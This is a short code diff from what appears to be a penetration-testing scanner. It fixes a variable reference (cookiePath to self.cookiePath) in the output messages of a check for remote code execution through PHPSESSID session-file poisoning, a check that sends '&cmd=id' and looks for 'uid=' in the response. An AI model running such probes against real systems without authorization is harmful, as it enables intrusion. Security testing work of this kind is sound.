@@ -250,9 +250,9 @@ class Payload:
 				compUrl = self.url + self.cookiePath + value + "&cmd=id"
 				clean = self.hit(compUrl)	
 				if 'uid='  in clean.lower():
-					print(colored('[+]', 'green', attrs=['bold']) + ' Remote code execution (RCE) found with the PHPSESSID cookie and the file ' + cookiePath + '[cookie value] can be poisoned')
+					print(colored('[+]', 'green', attrs=['bold']) + ' Remote code execution (RCE) found with the PHPSESSID cookie and the file ' + self.cookiePath + '[cookie value] can be poisoned')
 					if self.outfile is not None:
-						self.outfile.write('[+] Remote code execution (RCE) found with the PHPSESSID cookie and the file ' + cookiePath + '[cookie value] can be poisoned\n')
+						self.outfile.write('[+] Remote code execution (RCE) found with the PHPSESSID cookie and the file ' + self.cookiePath + '[cookie value] can be poisoned\n')
 					rce.append(compUrl)
 				else:
 					if self.verbosity > 0:
